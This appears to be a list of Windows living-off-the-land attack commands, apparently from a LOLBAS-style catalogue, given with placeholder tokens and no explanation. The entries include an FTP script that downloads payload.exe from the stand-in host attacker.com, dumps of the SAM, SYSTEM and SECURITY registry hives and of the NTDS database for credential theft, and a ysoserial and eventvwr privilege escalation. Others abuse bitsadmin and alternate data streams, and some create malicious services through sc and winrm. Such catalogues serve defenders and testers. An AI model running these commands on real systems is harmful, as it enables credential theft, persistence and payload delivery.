entries.command: bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c

bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset

bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}
sc config {ExistingServiceName} binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start {ExistingServiceName}
sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice

rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP"
set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="{CMD}"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985

wsb start
wsb share --id YOUR_ID -f {PATH_ABSOLUTE:folder} -s c:\SOME_FOLDER --allow-write
wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy {PATH_ABSOLUTE} c:\SOME_FOLDER"

wsb start --config "<Configuration><LogonCommand><Command>{CMD}</Command></LogonCommand></Configuration>"
wsb exec -r System --id YOUR_ID

wsb start --config "<Configuration><MappedFolders><MappedFolder><HostFolder>{PATH_ABSOLUTE:folder}</HostFolder><ReadOnly>false</ReadOnly></MappedFolder></MappedFolders></Configuration>"
wsb exec -r System --id YOUR_ID -c "cmd.exe /c copy C:\users\WDAGUtilityAccount\Desktop\Temp\{PATH} {PATH}"
